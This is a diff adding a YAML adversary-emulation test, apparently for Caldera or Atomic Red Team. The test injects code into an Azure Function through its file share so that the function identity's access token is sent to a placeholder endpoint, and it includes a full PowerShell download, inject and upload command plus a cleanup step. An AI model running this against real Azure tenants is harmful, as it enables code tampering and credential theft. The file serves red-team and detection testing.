@@ -1,0 +1,91 @@
+---
+- id: 9f6307af8beaef37efde788b693946be
+  name: Azure - Functions code upload - Functions code injection via File Share modification
+    to retrieve the Functions identity access token
+  description: "This test injects code into an Azure Function (RCE) to perform Subscription\
+    \ Privilege Escalation by retrieving the identity access token of an Azure functions\
+    \ instance.\n\nAttack idea/reference: https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/\n\
+    \nOnce executed, the \"https://changeme\" will retrieve the access token when\
+    \ the function app is executed on behalf of the tenant. The function may be triggered\
+    \ manually from authorized people, triggered in regular intervals, or in various\
+    \ other ways. The access token can then be used to perform further attack steps\
+    \ with the permissions that the function app holds (e.g. listening virtual machines).\n\
+    \nNote: \n- The Azure Function modified in this test must be hosted via Azure\
+    \ Files in a File Share (Info on storage considerations for Azure Function: https://learn.microsoft.com/en-us/azure/azure-functions/storage-considerations).\n\
+    - For Function code upload to Azure Functions that are hosted via Azure Blob storage,\
+    \ refer to T1528 \"Azure - Functions code upload - Functions code injection via\
+    \ Blob upload\".\n- The required input fields can be retrieved in a reconnaissance\
+    \ step in test T1619 \"Azure - Enumerate Storage Account Objects via Key-based\
+    \ authentication using Azure CLI\". The code of function apps may be inspected\
+    \ and prepared from the result of test T1530 \"Azure - Dump Azure Storage Account\
+    \ Objects via Azure CLI\".\n- Important: Change the https://changeme.net in code_to_insert_path\
+    \ to a self-controlled endpoint. This endpoint can be hosted e.g. as request bin\
+    \ via Pipedream to display the body of incoming POST requests.\n- The default\
+    \ injected code to retrieve the access token can be replaced by arbitrary other\
+    \ code. In this case: Replace the code defined in code_to_insert_path\n\nRequirements:\n\
+    - The test is intended to be executed in interactive mode (with -Interactive parameter)\
+    \ in order to complete the az login command when MFA is required.\n- The EntraID\
+    \ user must have the role \"Storage Account Contributor\", or a role with similar\
+    \ permissions.\n\nExecution options: Defined by the input field execution_option\n\
+    - insert_code: This option (1) downloads the existing funciton code into a tmp\
+    \ file, (2) injects the code from code_to_insert_path at the beginning of the\
+    \ file, and (3) uploads the tampered file to the targeted Azure Function code\
+    \ (Azure File Share File).\n- replace_file: This option uploads the function code\
+    \ defined in code_to_insert_path to the targeted Azure Function code (Azure File\
+    \ Share File)."
+  tactic: credential-access
+  technique:
+    attack_id: T1528
+    name: Steal Application Access Token
+  platforms:
+    unknown:
+      psh:
+        command: 'az login; $allowSharedKeyAccess = az storage account show --name
+          "storage_account_name_example" --query "allowSharedKeyAccess"; if ($allowSharedKeyAccess
+          -eq "false") {;     Write-Output "Shared key access is disabled for this
+          storage account."; } else {;     $tmpOriginalFileName = [System.IO.Path]::GetFileName("site/wwwroot/function_app.py");     $tmpOriginalFunctionCode
+          = Join-Path $env:temp/ ("T1528_tmp_original_" + $tmpOriginalFileName);     az
+          storage file download --account-name "storage_account_name_example" --share-name
+          "file_share_name_example" -p "site/wwwroot/function_app.py" --only-show-errors
+          --dest $tmpOriginalFunctionCode;     if ($LASTEXITCODE -eq 0) {;         if
+          ("insert_code" -eq "insert_code") {;             $tmpFunctionCode = Join-Path
+          $env:temp/ ("T1528_tmp_to_inject_" + $tmpOriginalFileName);             az
+          storage file download --account-name "storage_account_name_example" --share-name
+          "file_share_name_example" -p "site/wwwroot/function_app.py" --only-show-errors
+          --dest $tmpFunctionCode;             if ($LASTEXITCODE -ne 0) {;                 Write-Output
+          "Function code download failed.";                 exit 1;             };             Write-Output
+          "File downloaded: $($tmpFunctionCode)";             $insertContent = Get-Content
+          -Path "885c4b_code_to_insert.py" -Raw;             $content = Get-Content
+          -Path $tmpFunctionCode -Raw;             $content = $insertContent + "`n"
+          + $content;             $content | Set-Content -Path $tmpFunctionCode;             az
+          storage file upload --account-name "storage_account_name_example" --share-name
+          "file_share_name_example" -p "site/wwwroot/function_app.py" --source $tmpFunctionCode
+          --only-show-errors;             if ($LASTEXITCODE -ne 0) {;                 Write-Output
+          "Function code upload failed.";                 exit 1;             };             Write-Output
+          "Uploaded the tampered file";         } elseif ("insert_code" -eq "replace_file")
+          {;             az storage file upload --account-name "storage_account_name_example"
+          --share-name "file_share_name_example" -p "site/wwwroot/function_app.py"
+          --source "885c4b_code_to_insert.py" --only-show-errors;             if ($LASTEXITCODE
+          -ne 0) {;                 Write-Output "Function code upload failed.";                 exit
+          1;             };             Write-Output "Uploaded the tampered file";         }
+          else {;             Write-Output "Please choose a valid execution_option";             exit
+          1;         };     } else {;         Write-Output "Download original function
+          code failed.";         exit 1;     }; }'
+        payloads:
+        - 885c4b_code_to_insert.py
+        cleanup: 'az login; $tmpOriginalFileName = [System.IO.Path]::GetFileName("site/wwwroot/function_app.py");
+          $tmpOriginalFunctionCode = Join-Path $env:temp/ ("T1528_tmp_original_" +
+          $tmpOriginalFileName); az storage file upload --account-name "storage_account_name_example"
+          --share-name "file_share_name_example" -p "site/wwwroot/function_app.py"
+          --source $tmpOriginalFunctionCode --only-show-errors 2>$null; if ($LASTEXITCODE
+          -eq 0) {;     Write-Output "Uploaded original version of function code.";     if
+          ("insert_code" -eq "insert_code") {;         $tmpFunctionCode = Join-Path
+          $env:temp/ ("T1528_tmp_to_inject_" + $tmpOriginalFileName);         Remove-Item
+          -Path $tmpFunctionCode -Force -erroraction silentlycontinue;         Write-Output
+          "Deleted tmp file: $($tmpFunctionCode)";     };     Remove-Item -Path $tmpOriginalFunctionCode
+          -Force -erroraction silentlycontinue;     Write-Output "Deleted tmp original
+          file: $($tmpOriginalFunctionCode)"; } else {;     Write-Output "Upload original
+          function code failed."; }'
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
